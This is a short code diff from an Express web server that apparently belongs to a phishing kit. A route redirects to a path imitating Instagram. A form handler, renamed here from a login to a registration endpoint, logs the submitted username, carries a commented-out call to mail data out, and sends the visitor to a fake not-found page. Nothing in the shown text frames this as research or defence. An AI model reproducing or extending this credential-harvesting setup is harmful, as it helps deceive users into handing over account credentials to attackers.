@@ -24,7 +24,7 @@ app.get('/', (req,res) => {
    res.redirect('/instagranm/5bsinif/instalife/sheir/classmates/covid-19')
 });
 
-app.post('/login', (req,res) => {
+app.post('/registration', (req,res) => {
     console.log('Data',req.body.username);
    // sendMail();
    res.redirect('/not-found')
